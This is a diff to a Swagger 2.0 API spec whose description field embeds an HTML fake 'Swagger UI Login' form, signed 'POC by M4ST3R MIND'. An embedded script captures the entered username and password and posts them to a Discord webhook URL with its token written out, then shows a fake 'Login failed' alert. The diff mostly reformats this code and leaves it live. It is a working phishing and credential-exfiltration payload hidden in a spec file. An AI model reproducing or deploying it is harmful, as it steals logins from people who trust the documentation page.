@@ -2,58 +2,48 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Swagger UI Login
-  description: |
+  description: >
     <div style="font-family: 'Source Sans Pro', sans-serif; background: #f3f3f3; padding: 40px 0;">
-  <div style="max-width: 420px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.15); overflow: hidden;">
+    <div style="max-width: 420px; margin: auto; background: white; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.15); overflow: hidden;">
     <div style="background-color: #32329f; color: white; padding: 16px 24px;">
-      <h2 style="margin: 0; font-size: 20px;">Swagger UI Login</h2>
+    <h2 style="margin: 0; font-size: 20px;">Swagger UI Login</h2>
     </div>
     <form id="phish-form" style="padding: 24px;">
-      <label style="display: block; margin-bottom: 12px;">
-        <span style="font-size: 14px; color: #333;">Username</span>
-        <input type="text" name="username" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-      </label>
-      <label style="display: block; margin-bottom: 20px;">
-        <span style="font-size: 14px; color: #333;">Password</span>
-        <input type="password" name="password" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
-      </label>
-      <button type="submit" style="width: 100%; padding: 12px; background: #32329f; color: white; font-size: 16px; border: none; border-radius: 4px; cursor: pointer;">
-        Sign In
-      </button>
+    <label style="display: block; margin-bottom: 12px;">
+    <span style="font-size: 14px; color: #333;">Username</span>
+    <input type="text" name="username" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+    </label>
+    <label style="display: block; margin-bottom: 20px;">
+    <span style="font-size: 14px; color: #333;">Password</span>
+    <input type="password" name="password" required style="width: 100%; padding: 10px; margin-top: 6px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+    </label>
+    <button type="submit" style="width: 100%; padding: 12px; background: #32329f; color: white; font-size: 16px; border: none; border-radius: 4px; cursor: pointer;">
+    Sign In
+    </button>
     </form>
     <div style="background: #f7f7f7; padding: 12px 24px; font-size: 12px; color: #999; text-align: right;">
-      POC by M4ST3R MIND
+    POC by M4ST3R MIND
     </div>
-  </div>
-</div>
-
-<script>
-  document.getElementById('phish-form').addEventListener('submit', function (e) {
-    e.preventDefault(); // Prevent actual form submission
-
-    const username = this.username.value;
-    const password = this.password.value;
-
-    fetch("https://discord.com/api/webhooks/1391682964097732668/pwEKIM7IVLZZnsUarOokj1jPKrwFuPzrg0dlIKIxsWL1PxMlFdQAUh2vQzZcbRTe1lD3", {
-      method: "POST",
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        content: `🔥 **New Login Captured**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕓 Time: ${new Date().toLocaleString()}`
-      })
+    </div>
+    </div>
+    <script>
+    document.getElementById('phish-form').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const username = this.username.value;
+      const password = this.password.value;
+      fetch("https://discord.com/api/webhooks/1391682964097732668/pwEKIM7IVLZZnsUarOokj1jPKrwFuPzrg0dlIKIxsWL1PxMlFdQAUh2vQzZcbRTe1lD3", {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `🔥 **New Login Captured**\n👤 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🕓 Time: ${new Date().toLocaleString()}`
+        })
+      });
+      alert("Login failed. Please try again.");
     });
-
-    // Optional feedback to user
-    alert("Login failed. Please try again.");
-  });
-</script>
-
-
-  '
+    </script>
 paths:
   /:
     post:
       responses:
         '200':
-          description: Login successful
+          description: Login submitted
